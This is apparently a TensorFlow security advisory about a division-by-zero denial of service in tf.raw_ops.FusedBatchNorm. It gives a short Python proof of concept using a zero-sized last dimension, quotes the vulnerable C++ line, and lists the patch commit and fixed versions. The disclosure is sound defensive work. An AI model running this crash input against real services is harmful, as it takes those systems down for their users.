An attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.FusedBatchNorm`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/828f346274841fa7505f7020e88ca36c22e557ab/tensorflow/core/kernels/fused_batch_norm_op.cc#L295-L297) performs a division based on the last dimension of the `x` tensor. Since this is controlled by the user, an attacker can trigger a denial of service. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\nFrom Github:\n### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.FusedBatchNorm`:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)\nscale = tf.constant([], shape=[0], dtype=tf.float32)\noffset = tf.constant([], shape=[0], dtype=tf.float32)\nmean = tf.constant([], shape=[0], dtype=tf.float32)\nvariance = tf.constant([], shape=[0], dtype=tf.float32)\nepsilon = 0.0\nexponential_avg_factor = 0.0\ndata_format = \"NHWC\"\nis_training = False\n\ntf.raw_ops.FusedBatchNorm(\n    x=x, scale=scale, offset=offset, mean=mean,\n    variance=variance, epsilon=epsilon,\n    exponential_avg_factor=exponential_avg_factor,\n    data_format=data_format, is_training=is_training)\n``` \n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/828f346274841fa7505f7020e88ca36c22e557ab/tensorflow/core/kernels/fused_batch_norm_op.cc#L295-L297) performs a division based on the last dimension of the `x` tensor:\n\n```cc \nconst int depth = x.dimension(3);\nconst int rest_size = size / depth;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [1a2a87229d1d61e23a39373777c056161eb4084d](https://github.com/tensorflow/tensorflow/commit/1a2a87229d1d61e23a39373777c056161eb4084d).\n\nThe fix will be included in TensorFlow 2.5.0.
